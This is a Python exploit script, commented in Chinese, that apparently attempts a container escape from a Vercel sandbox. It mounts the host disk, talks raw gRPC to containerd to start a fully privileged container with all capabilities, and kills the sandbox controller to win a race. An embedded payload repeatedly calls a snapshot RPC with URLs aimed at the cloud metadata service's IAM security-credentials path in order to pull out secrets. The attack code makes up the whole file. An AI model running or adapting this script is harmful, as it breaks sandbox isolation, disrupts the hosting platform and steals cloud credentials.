# -*- coding: utf-8 -*-
"""vda63: 完整 race —— 容器持续打 CreateSnapshot, guest 提前 kill sandboxctrl
通道: COW (/vercel/sandbox) 持久日志; 容器监听 18080 (host netns) 捕获 host 侧回连
"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v63m.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v63m.out'

SHARE = '/run/vercel/share'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    try:
        open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, t=6, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:200]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


PAYLOAD = r'''# -*- coding: utf-8 -*-
import socket, time, os, threading
OUT = '/vercel/sandbox/v63c.out'
def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8').write(line + '\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass

def http_server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 18080))
        srv.listen(16)
        srv.settimeout(1)
        log('HOST_LISTEN 18080 ok')
        while True:
            try:
                c, addr = srv.accept()
            except socket.timeout:
                continue
            try:
                c.settimeout(2)
                data = b''
                while b'\r\n\r\n' not in data:
                    chunk = c.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n')
                log('HOSTFETCH %s %s' % (addr[0], data[:400].decode(errors='replace').replace('\n', ' ')))
            except Exception as e:
                log('http EXC %s' % type(e).__name__)
            finally:
                try:
                    c.close()
                except Exception:
                    pass
    except Exception as e:
        log('http server EXC %s' % type(e).__name__)

def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''

CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
IMDS = ['s3://169.254.169.254/latest/meta-data/',
        's3://169.254.169.254/latest/meta-data/iam/security-credentials/',
        's3://169.254.169.254/latest/meta-data/placement/availability-zone']

def main():
    threading.Thread(target=http_server, daemon=True).start()
    log('V63 payload start pid=%d' % os.getpid())
    n = 0
    free = 0
    t_end = time.time() + 55
    while time.time() < t_end:
        if free >= 2:
            url = IMDS[n % len(IMDS)]
        else:
            url = 's3://127.0.0.1:18080/hit%d.bin' % (n % 200)
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc(CSP, body, t=3)
        dt = time.time() - t0
        changed = ('in use' not in bd)
        if n % 5 == 0 or changed or n < 3:
            log('snap#%d %-52s -> %s (%.3fs) | %s' % (n, url, st, dt, bd[:220].replace('\n', ' ')))
        if changed:
            free += 1
            log('*** FREE@#%d %s -> %s' % (n, url, bd[:300]))
            for j in range(25):
                u2 = IMDS[j % len(IMDS)]
                st2, bd2 = rpc(CSP, '{"drive_id":"sandbox","base_url":"%s"}' % u2, t=3)
                log('IMDS#%d %-52s -> %s | %s' % (j, u2, st2, bd2[:200].replace('\n', ' ')))
                time.sleep(0.05)
        n += 1
        time.sleep(0.05)
    log('V63C_DONE')
main()
'''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount vda ret=%d' % ret)

    CSP = '/mnt/vdax/run/containerd/containerd.sock'
    IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CID = 'v63pwn'

    pf = '/vercel/sandbox/v63_payload.py'
    try:
        open(pf, 'w').write(PAYLOAD)
        log('payload written to COW %d bytes' % len(PAYLOAD))
    except Exception as e:
        log('payload write ERR %s' % e)

    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out or b'')
    sk = m.group().decode() if m else None
    log('list %s snap_key=%s' % (rc, sk))

    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c",
                     "echo V63_START $$ > /tmp/v63c.out 2>&1;"
                     "mkdir -p /mnt/g/run /mnt/g/proc /mnt/g/mnt/h;"
                     "timeout 8 mount /dev/vdb /mnt/g 2>&1;"
                     "M_RC=$?;"
                     "echo VDB_RC=$M_RC >> /tmp/v63c.out;"
                     "echo VDB_RC=$M_RC >> /mnt/g/vercel/sandbox/v63c.out 2>&1;"
                     "if [ $M_RC -eq 0 ]; then"
                     " mount --bind /run /mnt/g/run 2>&1; echo BIND_RUN=$? >> /mnt/g/vercel/sandbox/v63c.out;"
                     " mount --bind /proc /mnt/g/proc 2>&1; echo BIND_PROC=$? >> /mnt/g/vercel/sandbox/v63c.out;"
                     " ls -la /mnt/g/run/cell/ >> /mnt/g/vercel/sandbox/v63c.out 2>&1;"
                     " /sbin/chroot /mnt/g /usr/bin/python3 /vercel/sandbox/v63_payload.py "
                     ">> /mnt/g/vercel/sandbox/v63c.out 2>&1;"
                     " echo CHROOT_RC=$? >> /mnt/g/vercel/sandbox/v63c.out;"
                     "fi;"
                     "echo V63_END >> /mnt/g/vercel/sandbox/v63c.out 2>&1;"
                     "sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
            "cwd": "/",
            "capabilities": {"bounding": caps, "effective": caps, "permitted": caps, "ambient": caps}
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "bind", "source": "/dev", "options": ["rbind", "rw"]},
            {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["rbind", "ro"]},
            {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["rbind", "ro"]},
            {"destination": "/sbin", "type": "bind", "source": "/sbin", "options": ["rbind", "ro"]},
            {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["rbind", "ro"]},
            {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["rbind", "ro"]},
            {"destination": "/etc", "type": "bind", "source": "/etc", "options": ["rbind", "ro"]},
            {"destination": "/run", "type": "bind", "source": "/run", "options": ["rbind", "rw"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v63pwn-ctr",
            "namespaces": [{"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec) + pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(pmsg(1, ctr)), t=8)
    log('Create %s out=%r' % (rc, out[:200]))
    ok = 'grpc-status: 0' in rc
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Create %s out=%r' % (rc, out[:200]))
        ok = 'grpc-status: 0' in rc
        if not ok:
            try:
                fp = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s/log.json' % CID
                if os.path.exists(fp):
                    log('log.json: %s' % open(fp, 'rb').read(1500).decode(errors='replace')[-800:])
            except Exception:
                pass
    if ok:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(pstr(1, CID)), t=10)
        log('Tasks/Start %s out=%r' % (rc, out[:150]))

    # payload 稳定后立即 kill sandboxctrl (不等 payload 完成, race 窗口)
    log('wait 3s for payload then KILL sandboxctrl')
    time.sleep(3)
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    targets = []
    try:
        for d in sorted(os.listdir(base)):
            if d != CID:
                targets.append(d)
    except Exception as e:
        log('list task ERR %s' % e)
    log('kill targets: %s' % targets)
    for cid in targets:
        rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Kill',
                          grpc_env(pstr(1, cid) + pvarint(3 << 3 | 0) + pvarint(9)), t=4)
        log('kill %s %s' % (cid, rc))

    # 轮询 COW 通道: 观察 kill 后 drive 释放的响应变化 (1s 间隔, 30s 上限)
    t_wait = 0
    seen = ''
    done = False
    while t_wait < 30 and not done:
        time.sleep(1)
        t_wait += 1
        try:
            fp = '/vercel/sandbox/v63c.out'
            cur = ''
            if os.path.exists(fp):
                cur = open(fp, errors='replace').read()
            if cur != seen:
                seen = cur
                log('--- COW v63c.out @%ds ---\n%s' % (t_wait, cur[-2500:]))
            if 'V63C_DONE' in cur or 'V63_END' in cur:
                done = True
        except Exception as e:
            log('poll COW EXC %s' % e)
    log('V63M_DONE')
    f.close()


if __name__ == '__main__':
    main()
